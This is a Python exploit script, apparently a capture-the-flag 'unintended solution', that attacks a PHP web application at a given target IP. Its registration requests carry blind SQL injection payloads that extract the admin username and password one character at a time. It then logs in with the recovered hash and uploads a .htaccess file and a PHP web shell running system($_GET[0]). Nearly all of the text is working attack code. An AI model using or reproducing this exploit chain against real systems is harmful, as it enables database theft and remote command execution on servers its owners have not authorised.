### Unintended solution ###
# @giovannichhatta
import hashlib, string, requests, sys, argparse
 
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="IP address of the target.")
args = parser.parse_args()
 
if not args.target:
    parser.print_help()
    sys.exit(0)
 
PROXY = {
    "http" : "http://127.0.0.1:8080"    
}
 
TARGET = args.target
 
def sha1(string):
    string = string
    m = hashlib.sha1()
    m.update(string.encode('utf-8'))
    return m.hexdigest()
 
def Upload(username, password, filename, fileContent):
    url = f"http://{TARGET}/admin/welcome.php"
    cookies = Login(username, password, True)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------324239038032575636314150475280", "Origin": "http://192.168.206.189", "Connection": "close", "Referer": f"http://{TARGET}/admin/welcome.php", "Upgrade-Insecure-Requests": "1"}
    data = f"-----------------------------324239038032575636314150475280\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\nContent-Type: text/plain\r\n\r\n{fileContent}\r\n-----------------------------324239038032575636314150475280\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nUpload\r\n-----------------------------324239038032575636314150475280--\r\n"
    requests.post(url, headers=headers, cookies=cookies, data=data)
 
def Login(username, password='test', admin=False):
    password = password if admin else sha1(sha1(password) + "swag")
    session = requests.session()
    url = f"http://{TARGET}/login.php" if not admin else f"http://{TARGET}/admin/login.php"
    data = {"form_password_hidden": password, "username": username, "password": '', "submit": "Submit","token" : "swag"}
    session.post(url, data=data,proxies=PROXY)
    cookies = session.cookies.get_dict()
 
    if admin:
        return cookies    
    else:
        return CheckResponse(cookies) 
 
def CheckResponse(cookies):
    r = requests.get(f"http://{TARGET}/user_log.php", cookies=cookies, proxies=PROXY)
    return len(r.content)
 
def Register(payload, password='test'):
    password = sha1(password)
    url = f"http://{TARGET}/register.php"
    data = {"form_password_hidden": password, "username": payload, "password": '', "register": "Submit"}
    requests.post(url, data=data)
    return Login(payload)
 
def Bruteforce(payload):
    FALSERESPONSE = Register("' or 1=2 -- -")
    index = 1
    falseInARow = 0
    output = ""
    for i in range(1000):
        if falseInARow > 96:
            break
 
        for char in string.printable[:-6]:
            if Register(payload.replace("[P]",char).replace("[C]", str(index))) != FALSERESPONSE:
                falseInARow = 0
                output += char
                sys.stdout.write(char)
                sys.stdout.flush()
                index += 1
                break
            else:
                falseInARow += 1
    print()
    return output
 
def UploadShell(username, password):
    Upload(username, password, ".htaccess", "")
    Upload(username, password, "shell.pHp", "<?php system($_GET[0]); ?>")
 
def Main():
    print("Fetching Username: ", end='')
    username = Bruteforce("' or (SELECT SUBSTRING(username,[C],1) from admin where id = 1) = '[P]' -- -")
    print("Fetching password: ", end='')
    password = Bruteforce("' or (SELECT SUBSTRING(password,[C],1) from admin where id = 1) = '[P]' -- -")
    password = sha1(password + "swag")
    print(f"Passing the hash with {password}")
    UploadShell(username, password)
 
if __name__ == '__main__':
    Main()
